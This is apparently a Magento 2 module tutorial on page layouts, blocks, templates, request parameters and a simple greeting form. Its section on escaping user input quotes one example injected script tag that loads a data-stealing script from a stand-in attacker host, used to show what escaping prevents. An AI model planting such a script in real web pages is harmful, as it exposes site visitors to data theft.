# Rendering Page Layout

Now that we did successfully shown our custom response we may want more.
As our simple response is not showing whole page - what steps we should do in order to embed our response in full website?

## Starting rendering engine

In order to start page rendering engine our action controller should return `Magento\Framework\View\Result\Page` object.
We can achieve that by changing parameter passed to `Magento\Framework\Controller\ResultFactory`.

```php
<?php

namespace MMAcademy\Hello\Controller\Index;

use Magento\Framework\App\Action\Action;
use Magento\Framework\App\ResponseInterface;
use Magento\Framework\Controller\ResultFactory;
use Magento\Framework\View\Result\Page;

class Index extends Action
{
    /**
     * Dispatch request
     *
     * @return \Magento\Framework\Controller\ResultInterface|ResponseInterface
     * @throws \InvalidArgumentException
     * @throws \Magento\Framework\Exception\NotFoundException
     */
    public function execute()
    {
        /** @var Page $result */
        $result = $this->resultFactory->create(ResultFactory::TYPE_PAGE);

        return $result;
    }
}
```

With above code in our controller action we should see our page rendered fully, but without our message.

## Page structure

Page structure is represented by tree-like structure build of containers and blocks that guides final HTML rendering.
Details will be covered in [Frontend: Layout](/frontend/layout/overview.md) section.
But for now we should know that we can reference containers in order to add blocks to them.
Blocks will be connected to php class that contains it's rendering logic.

Final page structure is build based on xml files that are composed together based on handles registered for given page.
Apart from `default` handle standard router automatically applies handle based on current action controller.
Handle is build based on route identifier, controller name and action controller name - in our case result will be as follows: `hello_index_index`.

Lets add `view/frontend/layout/hello_index_index.xml` file to our module so we can impact page rendered by `MMAcademy\Hello\Controller\Index\Index`. 

```xml
<?xml version="1.0"?>

<page xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      layout="3columns"
      xsi:noNamespaceSchemaLocation="urn:magento:framework:View/Layout/etc/page_configuration.xsd">
    <body>
        <referenceContainer name="main">
            <block name="hello" class="MMAcademy\Hello\Block\Hello"/>
        </referenceContainer>
    </body>
</page>
```

Code above will enforce 3 column layout for rendered page (via `layout` attribute on `page` element) and add block with name `hello` to `main` container (representing center of the page).
In `hello` block definition we bound it with `MMAcademy\Hello\Block\Hello` class as it's implementation.

So let's create minimalistic version of this block.
Base for all blocks is `Magento\Framework\View\Element\AbstractBlock` and provides base implementation of `Magento\Framework\View\Element\BlockInterface`.
In order to see our message we only have to provide implementation of abstracted `prodected function _toHtml()` method.

```php
<?php

namespace MMAcademy\Hello\Block;

use Magento\Framework\View\Element\AbstractBlock;

class Hello extends AbstractBlock
{
    protected function _toHtml()
    {
        return 'test';
    }
}
```

## Using templates

But of course we should not mix business logic with view logic.
In order to achieve that it is very common to base block class implementations on `Magento\Framework\View\Element\Template` class.
This class provides implementation of `_toHtml()` method that will lookup template file and use it to render response.
That way block logic is contained in block class and view logic is contained within template file.

We can provide path to default template using `$_template` property.
Template path can consists of module name that provides template file and name of template file within that module concatenated by `::`.

```php
<?php

namespace MMAcademy\Hello\Block;

use Magento\Framework\View\Element\Template;

class Hello extends Template
{
    protected $_template = 'MMAcademy_Hello::hello.phtml';
}
```

It is common to use `.phtml` extensions to differentiate between php files with business logic and those with view logic.
Now lets create our template in `view/frontend/templates/hello.phtml`.

```php
<?php /** @var \MMAcademy\Hello\Block\Hello $block */ ?>
<h1>Hello there</h1>
<p>Oh, hi hello, how are You?</p>
```

Note that first line is optional and only informs Your IDE that this template is bound with specific class.

## Accessing request data 

To finish up with this example let's access request parameters in order to greet user by his name.

Block abstract implementation allows us to access current request via `$_request` property so lets create new public method that will return value of `name` param.

```php
<?php

namespace MMAcademy\Hello\Block;

use Magento\Framework\View\Element\Template;

class Hello extends Template
{
    protected $_template = 'MMAcademy_Hello::hello.phtml';

    public function getName()
    {
        return $this->_request->getParam('name');
    }
}
```

And now lets add some view logic to our template.
We would like to show different messages when we know and when we don't know customers name.

```php
<?php /** @var \MMAcademy\Hello\Block\Hello $block */ ?>
<h1>Hello there</h1>
<?php if($block->getName()): ?>
    <p>Whats up <?= $block->escapeHtml($block->getName()) ?>?</p>
<?php else: ?>
    <p>Oh, hi hello, how are You?</p>
<?php endif ?>
```

> `<?= $message ?>` is shorthand for `<?php echo($message) ?>`

So You can see that we added `if` statement based on result of `getName()` method we added in our block.
Also we did use `escapeHtml($message)` method to prevent injection of malicious code (like `<script src="http://hacker.me/steal_all_data.js"/>`) via `name` parameter.

You can now try in You browsers addresses like `/hello?name=Bob` or `/hello/index/index/name/Alice` to see that both parameter passing methods work correctly.

## Form example

As You can imagine manually adding parameters is now user friendly and we should allow customers to submit this information using simple form on store front.

Lets add new block with form to every page that contains a sidebar by createing file `view/frontend/layout/default.xml` that will impact page structure of every request resulting in page rendering.

```xml
<?xml version="1.0"?>

<page xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      layout="3columns"
      xsi:noNamespaceSchemaLocation="urn:magento:framework:View/Layout/etc/page_configuration.xsd">
    <body>
        <referenceContainer name="sidebar.main">
            <block name="hello-form" class="MMAcademy\Hello\Block\Form"/>
        </referenceContainer>
    </body>
</page>
```

Now define class behaind that block in `Block/From.php`

```php
<?php

namespace MMAcademy\Hello\Block;

use Magento\Framework\View\Element\Template;

class Form extends Template
{
    protected $_template = 'MMAcademy_Hello::form.phtml';

    public function getFormAction()
    {
        return $this->getUrl('hello/index/index');
    }
}
```

As You can see it defines template that will be used and one public method that will point to our controller.

And here is example form that can be used for `view/frontend/templates/form.phtml`.

```php
<?php /** @var \MMAcademy\Hello\Block\Form $block */ ?>

<div>
    <form action="<?= $block->getFormAction() ?>" method="POST">
        <label for="hello-name">Your name</label>
        <input type="text" name="name" id="hello-name"/>

        <button type="submit">Greet</button>
    </form>
</div>
```

## Next Steps

* [Using translations](translations.md)

